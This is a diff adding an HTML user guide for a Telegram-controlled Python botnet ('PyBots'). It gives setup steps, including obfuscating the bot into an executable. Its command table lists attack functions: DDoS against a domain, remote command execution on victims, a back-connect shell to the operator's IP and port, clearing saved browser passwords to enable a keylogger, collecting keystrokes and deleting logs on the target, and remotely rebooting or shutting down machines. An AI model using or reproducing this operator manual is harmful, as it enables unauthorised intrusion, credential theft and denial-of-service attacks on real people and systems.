@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="Content-Type" content="text/html; charset=windows-1251"/>
+        <meta http-equiv="Content-Style-Type" content="text/css"/>
+        <meta http-equiv="Content-Script-Type" content="text/javascript"/>
+        <title>User guide</title>
+            <style type="text/css">
+                html, body{
+                background:  #FFFFFF;
+                color:       #000000;
+                font-family: Verdana, Helvetica, sans-serif;
+                font-size:   12px
+              }
+              a{
+                color: #0060B6
+              }
+              a:hover{
+                color: #174C7E
+              }
+              h1, h2{
+                padding:       2em 0 0.5em 0;
+                border-bottom: solid 1px #CCCCCC
+              }
+              h1{
+                padding-top: 0
+              }
+              table.list{
+                border-collapse: collapse
+              }
+              table.list td{
+                padding:    1em;
+                background: #EEEEEE;
+                border:     1px solid #CCCCCC
+              }
+        </style>
+    </head>
+    <body>
+
+        <h1>User guide</h1>
+        <ul>
+          <li><a href="#cp_server">Control panel</a>
+            <ul>
+              <li><a href="#cp_install">Install</a></li>
+              <li><a href="#cp_configuration">Config</a></li>
+              <li><a href="#cp_commands">Commands</a></li>
+            </ul>
+          </li>
+        </ul>
+
+        <h2 id="cp_install">Installation</h2>
+        <p>first you should have python3 and pip in your computer, and than</p>
+        <p>just use this command for install dependencies:</p>
+        <table class="list">
+            <tr><td>1</td><td>pip3 install -r requirements.txt</td></tr>
+        </table>
+
+        <h2 id="cp_configuration">Control panel: configuration</h2>
+        <p>The server is the central point of control the botNet, it is engaged in collecting reports of bots and command bots. config on telegram bot because it's secure.</p>
+        <ul>
+            <li>first create an telegram bot and get the token.</li>
+            <li>find your telegram id number for admin commands.</li>
+            <li>find admin and token in PyBots.py and replace yours:</li>
+            <br>
+                <table class="list">
+                    <tr><td>130</td><td>admin =  "add telegram number id here"</td></tr>
+                    <tr><td>131</td><td>token =  "add token here"</td></tr>
+                </table>
+            <br>
+            <li>for obfuscate and create executable file, just run this command:</li>
+            <br>
+                <table class="list">
+                    <tr><td>1</td><td> python3 run.py </td></tr>
+                </table>
+            <br>
+        </ul>
+
+        <h2 id="cp_commands">Commands</h2>
+        <p>Commands:</p>
+        <table class="list">
+            <tr><td>/sayHay</td><td>all online bots response.</td></tr>
+            <tr><td>/shutUp</td><td>all online bots will down.</td></tr>
+            <tr><td>/d_dos domain</td><td>all online bots attack to domain.</td></tr>
+            <tr><td>/power commands</td><td>commands execute on target, linux and windows.</td></tr>
+            <tr><td>/backConnect yourIp:port</td><td>python BackConnect will run.</td></tr>
+            <tr><td>/clearPass</td><td>clear keys on chrome and Firefox for keyLogger attack, linux and windows.</td></tr>
+            <tr><td>/keys</td><td>start keyLogger to listen.</td></tr>
+            <tr><td>/downKeys</td><td>download the keyLogger file and Delete logs on target.</td></tr>
+            <tr><td>/reStart</td><td>reboot the target.</td></tr>
+            <tr><td>/shutDown</td><td>power off the target.</td></tr>
+        </table>
+
+
+    </body>
+</html>
